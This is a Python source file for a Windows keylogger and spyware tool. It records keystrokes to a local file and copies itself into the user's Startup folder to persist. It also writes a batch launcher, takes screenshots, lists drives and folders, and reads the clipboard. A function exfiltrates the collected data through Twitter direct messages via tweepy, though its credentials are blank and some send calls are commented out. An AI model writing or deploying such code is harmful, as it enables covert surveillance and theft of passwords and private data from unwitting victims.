import shutil
import os
import tweepy
from tweepy import DirectMessage
from pynput.keyboard import Listener,Key
from mss import mss
from win32 import win32api
from pathlib import Path
import getpass
from tkinter import Tk


keys=[]
count=0


def sendDm(entries):
    # assign the values accordingly

    consumer_key = " " 
    consumer_secret = "" 
    access_token = "" 
    access_token_secret = "" 

    # authorization of consumer key and consumer secret 
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret) 

    # set access to user's access key and access secret 
    auth.set_access_token(access_token, access_token_secret) 
    info=""
    message=""
    message=info.join(entries) #coverting entries list to type string to send dm
    # calling the api as
    api = tweepy.API(auth) 
    api.send_direct_message(recipient_id="",text=message)
   


def file_content():
    data=Path("keys.txt").read_text()#to store data from file keys.txt to send data variable and them DM it
    if len(data)>256:
           # sendDm(data)
          #  print(data)
            os.remove("keys.txt")
            f=open("keys.txt","w+")
            f.close()


      

def on_press(key):
    global keys,count
    keys.append(key)
    count +=1
    print("{0} pressed".format(key))
    if count >=10:
        count = 0
        write_file(keys)
        keys=[]
        key=[]
        file_content()


def write_file(keys):
    with open("keys.txt","a") as file:
        for key in keys:
            if key is Key.space:
                file.write("  ")
            else:
                file.write(str(key).replace("'","")) #wrting keys to files and replacing commas with empty string
                


def on_release(key):
    try:
       ## file_content()
        if key==Key.esc:
            return False
    except:
        open("keys.txt","w+")





def copyFile():
    script=os.path.basename(__file__)
    source = os.path.dirname(os.path.realpath(__file__)+f"\\{script}") #To get the current working directory
    username=getpass.getuser() 
    dest=f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy(source,dest)
    except:
        print("[!]File does not exist")  



def directoryList(source):
    drives = win32api.GetLogicalDriveStrings() #get list of all working drives on the pc
    drives = drives.split('\000')[:-1]
    mss().shot() #taking the screenshot to send to DM
    entries=os.listdir(source) #listing all the folders in source
    print(entries)
   ## sendDm(entries)
    ##sendDm(drives)


def add_to_startup():
    username=getpass.getuser()
    file_path = os.path.dirname(os.path.realpath(__file__)+"\\twitter.py") #To get the current working directory
    try:
        bat_path=f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        with open(bat_path+'\\'+"open.bat","w+") as bat_file:
            bat_file.write(f'start {file_path}')
        print("done")
    except:
        print("some error occured")


def clipboard():
    root=Tk()
    root.withdraw()
    number=root.clipboard_get()
    print(number)

def listener():
     #Starting the listner
    with Listener(on_press=on_press,on_release=on_release) as listener:
      listener.join() 

def main():
    copyFile()
    #add_to_startup()
    listener()   

if __name__=='__main__':
    main()


